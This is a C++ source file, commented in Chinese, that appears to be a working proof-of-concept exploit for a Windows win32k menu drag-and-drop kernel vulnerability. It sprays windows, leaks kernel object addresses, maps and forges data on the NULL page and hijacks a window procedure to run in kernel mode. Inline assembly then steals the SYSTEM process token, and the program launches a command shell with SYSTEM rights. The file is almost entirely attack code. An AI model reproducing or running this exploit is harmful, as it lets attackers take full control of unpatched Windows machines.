#include<Windows.h>
#include<iostream>
#include<intrin.h>
#include"leak.h"
using namespace std;




//////////////////////////////////////////////////////////////////////////////////
//
// global variables && prototypes
//

leak p_leak;
DWORD g_MenuCreate = NULL;
bool bOnDrag = false;
PVOID g_fakeWnd = nullptr;
ULONG_PTR g_uDraggingIndex = NULL;
PVOID g_primaryWnd = NULL;
PVOID g_secondWnd = NULL;
HWND g_SparyWindow[0x100] = { 0 };
HWND g_prepareToRead;
PVOID prepareToRead_addr;

#define MN_FINDMENUWINDOWFROMPOINT 0x1EB

void replaceWndProc();
void SetNullPageData();
EXTERN_C void ShellCode();


#ifdef _AMD64_
using pNtAllocateVirtualMemory = NTSTATUS(__fastcall*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

EXTERN_C void __fastcall NtUserMNDragOver(PPOINT pt, char* buf);

#else
using pNtAllocateVirtualMemory = NTSTATUS(__stdcall*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

__declspec(naked) void __stdcall NtUserMNDragOver(PPOINT pt, char* buf)
{
	__asm
	{
		mov eax, 0x11ED
		mov edx, 0x7FFE0300
		call dword ptr[edx]
		ret 8
	}
}
#endif // _AMD64_




//////////////////////////////////////////////////////////////////////////////////
//
// FakeWindowsProcedure for hMenuSub's tagMenuWnd
//

LRESULT CALLBACK FakeWindowProc(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) 
{
	if (uMsg == MN_FINDMENUWINDOWFROMPOINT)
	{
		SetWindowLongPtr(hwnd, GWLP_WNDPROC, (ULONG_PTR)DefWindowProc);

		cout << "wParam:0x" << hex << *(PULONG)wParam << endl;	

		g_uDraggingIndex = *(PULONG)wParam ;
		SetNullPageData();

		return (LRESULT)g_fakeWnd;
	}
	
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}


//////////////////////////////////////////////////////////////////////////////////
//
// SetWindowsHookEx's handler
//

LRESULT CALLBACK CallWndProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	PCWPSTRUCT msg = (PCWPSTRUCT)lParam;

	//__debugbreak();

	if (msg->message == MN_FINDMENUWINDOWFROMPOINT && bOnDrag)
	{
		cout << "msg: 0x" << hex << msg->message;
		cout << "\thwnd: 0x" << hex << msg->hwnd;

		auto hwnd_kernel = p_leak.GetUserObjectAddressBygSharedInfo(msg->hwnd, NULL);
		cout << "\thwnd_kernel: 0x" << hex << hwnd_kernel << endl;

		SetWindowLongPtr(msg->hwnd, GWLP_WNDPROC, (ULONG_PTR)FakeWindowProc);

	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


//////////////////////////////////////////////////////////////////////////////////
//
// SetWinEventHook's handler
//

void Wineventproc(
	HWINEVENTHOOK hWinEventHook,
	DWORD event,
	HWND hwnd,
	LONG idObject,
	LONG idChild,
	DWORD idEventThread,
	DWORD dwmsEventTime
)
{
	PVOID hMenuRoot_wnd;
	PVOID hMenSub_wnd;

	

	switch (g_MenuCreate)
	{
	case 0:
		//__debugbreak();
		SendMessage(hwnd, WM_LBUTTONDOWN, NULL, 0x00050005);       //在TrackPopupMenuEx内部通过xxxWindowEvent产生EVENT_SYSTEM_MENUPOPUPSTART事件，但是并没有立即产生用户回调
																   //而是在
																   //此时是hMenuRoot
		hMenuRoot_wnd = p_leak.GetUserObjectAddressBygSharedInfo(hwnd, NULL);
		cout << "hMenuRoot_wnd: 0x" << hex << hwnd << "\tkernelAddress: 0x" << hMenuRoot_wnd << endl;
		break;
	case 1:
		//__debugbreak();

		/*
		bOnDrag = 1;       //在这里将bOnDrag置1，虽然在WM_MOUSEMOVE消息处理函数xxxMouseMove中调用xxxMNFindWindowFromPoint时返回的是我们伪造的  g_fakeWnd，
						   //但由于tagMenuState->fInDoDragDrop并没有置位，因此不会触发调用xxxMNUpdateDraggingInfo的代码路径，所以还是通过调用NtUserMNDragOver将fInDoDragDrop置位
		*/

		SendMessage(hwnd, WM_MOUSEMOVE, NULL, 0x00050005);	       //当在hWndMain中处理了我们发送的WM_LBUTTONDOWN之后，此时hMenuSub会显示，同时会触发
																   //EVENT_SYSTEM_MENUPOPUPSTART用户回调，这时发送WM_MOUSEMOVE消息，由于鼠标已经是按下情况，
																   //因此会形成拖拽
		hMenSub_wnd = p_leak.GetUserObjectAddressBygSharedInfo(hwnd, NULL);
		cout << "hMenSub_wnd: 0x" << hex << hwnd << "\tkernelAddress: 0x" << hMenSub_wnd << endl;
		break;
	default:
		break;
	}
	g_MenuCreate++;
}


//////////////////////////////////////////////////////////////////////////////////
//
//	allocated NULL page
//

bool allocNullPage()
{

	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL)
	{
		cout << "get NtAllocateVirtualMemory address error\n";
		return false;
	}

	ULONG_PTR addr = 0x100;
	ULONG_PTR RegionSize = 0x1000;

	auto result = NtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&addr, NULL, &RegionSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	if (result != 0)
	{
		cout << "NtAllocateVirtualMemory error code:0x" << hex << result << endl;
		return false;
	}

	return true;
}


//////////////////////////////////////////////////////////////////////////////////
//
//	set NULL page data
//

void SetNullPageData()
{

#ifdef _AMD64_
	uint8_t NullPage = NULL;
	ULONG_PTR offset1 = (ULONG_PTR)g_primaryWnd - g_uDraggingIndex * 0x90;   // 注意g_uDraggingIndex必须是ULONG_PTR，否则ULONG在x64会发生溢出
	offset1 = offset1 + 0xe8 - 0x4;


	 ULONG_PTR	offset2 = (((ULONG_PTR)prepareToRead_addr + 0x128 + 0x90) - offset1 - 0x44) / 0x90;   //由于offset2只取了32位，而计算出来可能超过32位，因此无法重定位到零地址
																			
	 for (size_t i = 0; i < 0x90; i += 8)
	 {
		 //__debugbreak();
		 SetWindowLongPtr(g_prepareToRead, i, 0x7777777777777777);
	 }

	*(PULONG_PTR)(NullPage + 0x34)     = g_uDraggingIndex + 1;
	*(PULONG_PTR)(NullPage + 0x50)     = offset1;
	*(PULONG_PTR)(NullPage + 0x78)     = offset2;

#else

	uint8_t NullPage = NULL;
	ULONG_PTR offset1 = (ULONG_PTR)g_primaryWnd - g_uDraggingIndex * 0x6C;       // sizeof(tagItem32) = 0x6C
	offset1 = offset1 + 0x90 - 0x4;											     // point to g_primaryWnd->cbwndExtra


	ULONG_PTR offset2 = (0 - offset1) / 0x6C + 2;                                //如果只+1遇到刚好NullPage + 0x28 + (1*0x6C - offset2_remainder) = 0x4C
																				 //的情况，就会覆盖offset2的值，导致蓝屏
	ULONG_PTR offset2_remainder = (0 - offset1) % 0x6C;

	*(PULONG_PTR)(NullPage + 0x20) = g_uDraggingIndex + 1;				         //tagMENU->cItems, g_uDraggingIndex + 1使得xxxMNSetGapState!MNGetpItem第二次返回0
	*(PULONG_PTR)(NullPage + 0x34) = offset1;
	*(PULONG_PTR)(NullPage + 0x4C) = offset2;
	*(PULONG_PTR)(NullPage + 0x28 + (2 * 0x6C - offset2_remainder)) = 0x7ffffffe;

#endif // _AMD64_

}


//////////////////////////////////////////////////////////////////////////////////
//
//	spary window
//

bool SparyWindow()
{
	WNDCLASSEXA wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = GetModuleHandle(NULL);
	wndClass.lpszMenuName = 0;
	wndClass.lpszClassName = "SparyClass";
	RegisterClassExA(&wndClass);
	for (size_t i = 0; i < 0x100; i++)
	{
		g_SparyWindow[i] = CreateWindowA("SparyClass", NULL, WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, GetModuleHandle(NULL), nullptr);
		if (g_SparyWindow[i] == NULL)
		{
			return false;
		}
	}

	g_primaryWnd = p_leak.GetUserObjectAddressBygSharedInfo(g_SparyWindow[0x98], NULL);
	g_secondWnd = p_leak.GetUserObjectAddressBygSharedInfo(g_SparyWindow[0x99], NULL);

	if (((ULONG_PTR)g_secondWnd - (ULONG_PTR)g_primaryWnd) > 0x40000000)
	{
		return false;
	}

	cout << "g_primaryWnd: 0x" << hex << g_SparyWindow[0x98] << "\tkernelAddress: 0x" << g_primaryWnd << endl;
	cout << "g_secondWnd: 0x" << hex << g_SparyWindow[0x99] << "\tkernelAddress: 0x" << g_secondWnd << endl;
	
#ifdef _AMD64_
	WNDCLASSEXA wndClass2 = { 0 };
	wndClass2.cbSize = sizeof(WNDCLASSEXA);
	wndClass2.lpfnWndProc = DefWindowProc;
	wndClass2.cbClsExtra = 0;
	wndClass2.cbWndExtra = 0x90;                       
	wndClass2.hInstance = GetModuleHandle(NULL);
	wndClass2.lpszMenuName = 0;
	wndClass2.lpszClassName = "SparyClass2";
	RegisterClassExA(&wndClass2);
	
	g_prepareToRead = CreateWindowA("SparyClass2", NULL, WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, GetModuleHandle(NULL), nullptr);
	prepareToRead_addr = p_leak.GetUserObjectAddressBygSharedInfo(g_prepareToRead, NULL);
	cout << "g_prepareToRead: 0x" << hex << g_prepareToRead << "\tkernelAddress: 0x" << prepareToRead_addr << endl;

#endif // _AMD64_



	return true;
}


//////////////////////////////////////////////////////////////////////////////////
//
//	entry point
//

int main()
{
	

	if (!SparyWindow())
	{
		return false;
	}

	

	if (!allocNullPage())
	{
		cout << "error in alloc null page\n";
		return false;
	}
	
	

	SetWindowsHookEx(WH_CALLWNDPROC, CallWndProc, NULL, GetCurrentThreadId());
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART, NULL, (WINEVENTPROC)Wineventproc, GetCurrentProcessId(), GetCurrentThreadId(), NULL);

	

	g_fakeWnd = CreateWindowEx(0, L"#32768", L"SB", 0x80800000, 0, 0, 0, 0, 0, 0, 0,0);

	HMENU hMenuRoot = CreatePopupMenu();
	HMENU hMenuSub = CreatePopupMenu();

	

	MENUINFO mi = { 0 };
	mi.cbSize = sizeof(MENUINFO);
	mi.fMask = MIM_STYLE;
	mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP;			 //非模态菜单，否则弹出菜单会被销毁
	SetMenuInfo(hMenuRoot, &mi);
	SetMenuInfo(hMenuSub, &mi);

	AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, "Root");
	AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, 0, "Sub");

	auto hMenuRoot_kernel = p_leak.GetUserObjectAddressBygSharedInfo(hMenuRoot, NULL);
	auto hMenuSub_kernel = p_leak.GetUserObjectAddressBygSharedInfo(hMenuSub, NULL);

	cout << "hMenuRoot: 0x" << hex << hMenuRoot << "\tkernelAddress: 0x" << hMenuRoot_kernel << endl;
	cout << "hMenuSub: 0x" << hex << hMenuSub << "\tkernelAddress: 0x" << hMenuSub_kernel << endl;

	//getchar();

	WNDCLASSEXA wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = GetModuleHandle(NULL);
	wndClass.lpszMenuName = 0;
	wndClass.lpszClassName = "WNDCLASSMAIN";
	RegisterClassExA(&wndClass);
	auto hWndMain = CreateWindowA("WNDCLASSMAIN", "CVE", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, GetModuleHandle(NULL), nullptr);

	TrackPopupMenuEx(hMenuRoot, 0, 0, 0, hWndMain, NULL);   //RECT会被强制填充为0x14,0x14


	{
		auto g_fakeWnd_kernel = p_leak.GetUserObjectAddressBygSharedInfo(g_fakeWnd, NULL);
		auto hMenuRoot_kernel = p_leak.GetUserObjectAddressBygSharedInfo(hMenuRoot, NULL);
		auto hMenuSub_kernel = p_leak.GetUserObjectAddressBygSharedInfo(hMenuSub, NULL);
		auto hWndMain_kernel = p_leak.GetUserObjectAddressBygSharedInfo(hWndMain, NULL);



		cout << "g_fakeWnd: 0x" << hex << g_fakeWnd << "\tkernelAddress: 0x"<< g_fakeWnd_kernel << endl;
		cout << "hMenuRoot: 0x" << hex << hMenuRoot << "\tkernelAddress: 0x" << hMenuRoot_kernel << endl;
		cout << "hMenuSub: 0x" << hex << hMenuSub << "\tkernelAddress: 0x" << hMenuSub_kernel << endl;
		cout << "hWndMain: 0x" << hex << hWndMain << "\tkernelAddress: 0x" << hWndMain_kernel << endl;
	}

	cout << "CallWndProc: 0x" << hex << CallWndProc << endl;


	MSG msg = { 0 };
	while (GetMessage(&msg,NULL,NULL,NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);


		if (g_MenuCreate == 2)
		{
			bOnDrag = true;
			POINT pt;
			char buf[100];
			pt.x = 2;
			pt.y = 2;

			//__debugbreak();

			NtUserMNDragOver(&pt, buf);
			g_MenuCreate++;
			break;
		}

	}

	DestroyWindow((HWND)g_fakeWnd);
	DestroyWindow(hWndMain);
	DestroyMenu(hMenuRoot);
	DestroyMenu(hMenuSub);
	
    replaceWndProc();


	return true;
}


LRESULT CALLBACK WndProc_kernel(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{

#ifdef _AMD64_

	ShellCode();

#else
	__asm {
		pushad
		mov eax, fs: [0x124]   //CurrentThread
		mov eax, [eax + 0x150] //Process  
		lea edx, [eax + 0xf8]  //MyProcess.Token
noFind :
		mov eax, [eax + 0xb8]  //Eprocess.ActiveProcessLinks
		sub eax, 0xb8          //next Eprocess struct
		mov ebx, [eax + 0xb4]  //PID
		cmp ebx, 4
		jnz noFind
		mov eax, [eax + 0xf8]  //System.Token
		mov[edx], eax
		popad
}
#endif // _AMD64_



	SetWindowLongPtr(hwnd, GWLP_WNDPROC, (ULONG_PTR)DefWindowProc);

	return false;
}




void replaceWndProc()
{

#ifdef _AMD64_
	ULONG_PTR offset = (((ULONG_PTR)g_secondWnd + 0x90) - ((ULONG_PTR)g_primaryWnd + 0x128));
#else
	ULONG_PTR offset = (((ULONG_PTR)g_secondWnd + 0x60) - ((ULONG_PTR)g_primaryWnd + 0xb0));
#endif // _AMD64_

	

	SetWindowLongPtr(g_SparyWindow[0x98], offset, (ULONG_PTR)WndProc_kernel);

	SendMessage(g_SparyWindow[0x99], WM_MOUSEMOVE, NULL, 0x00050005);              //触发g_secondWnd的消息处理函数

	system("cmd");

	DestroyWindow(g_SparyWindow[0x98]);
	DestroyWindow(g_SparyWindow[0x99]);
}